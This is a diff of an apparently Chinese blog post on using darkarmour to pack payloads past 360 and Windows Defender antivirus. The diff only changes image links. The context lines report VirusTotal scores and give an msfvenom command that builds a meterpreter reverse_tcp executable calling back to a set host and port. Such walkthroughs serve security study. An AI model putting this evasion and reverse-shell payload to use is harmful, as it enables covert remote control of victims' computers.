@@ -16,7 +16,7 @@ __
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194459.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194459.png)
 
   
 
@@ -44,11 +44,11 @@ u参数：用upx打包可执行文件
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194504.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194504.png)
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194505.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194505.png)
 
   
 
@@ -56,7 +56,7 @@ u参数：用upx打包可执行文件
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194507.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194507.png)
 
   
 
@@ -66,19 +66,19 @@ u参数：用upx打包可执行文件
 
 Bypass 360 success!
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194508.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194508.png)
 
   
 
 Bypass Windows Defender success!
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194509.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194509.png)
 
   
 
 V站评分10/66
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194511.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194511.png)
 
   
 
@@ -103,11 +103,11 @@ V站评分10/66
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194512.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194512.png)
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194513.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194513.png)
 
   
 
@@ -115,7 +115,7 @@ V站评分10/66
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194514.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194514.png)
 
   
 
@@ -125,19 +125,19 @@ V站评分10/66
 
 Bypass 360 success!
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194516.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194516.png)
 
   
 
 Bypass Windows Defender success!
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194517.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194517.png)
 
   
 
 V站评分22/66（分数不太可观，可能和我设置的加密等级有关）
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194518.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194518.png)
 
   
 
@@ -151,7 +151,7 @@ V站评分22/66（分数不太可观，可能和我设置的加密等级有关�
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194519.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194519.png)
 
   
 
@@ -171,7 +171,7 @@ V站评分22/66（分数不太可观，可能和我设置的加密等级有关�
 
  **排坑1：报错“sh: 1: x86_64-w64-mingw32-gcc: not foundded.exe...”**
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194520.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194520.png)
 
  **解决方法：**  
 
@@ -205,7 +205,7 @@ V站评分22/66（分数不太可观，可能和我设置的加密等级有关�
      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.160.128 LPORT=4488 -f exe -o msf.exe
 
 注意：payload一定得是windows/x64/meterpreter/reverse_tcp  
-（别问为什么，我也不清楚，我一开始上线不成功，最后排查到居然是payload的问题，想不明白为什么，这里浪费好些时间![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194521.png)）
+（别问为什么，我也不清楚，我一开始上线不成功，最后排查到居然是payload的问题，想不明白为什么，这里浪费好些时间![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194521.png)）
 
   
 
@@ -219,7 +219,7 @@ V站评分22/66（分数不太可观，可能和我设置的加密等级有关�
     
      https://github.com/bats3c/darkarmour
 
-感谢所有前辈的开源精神以及知识分享![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194522.png)
+感谢所有前辈的开源精神以及知识分享![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210916194522.png)
 
   
 
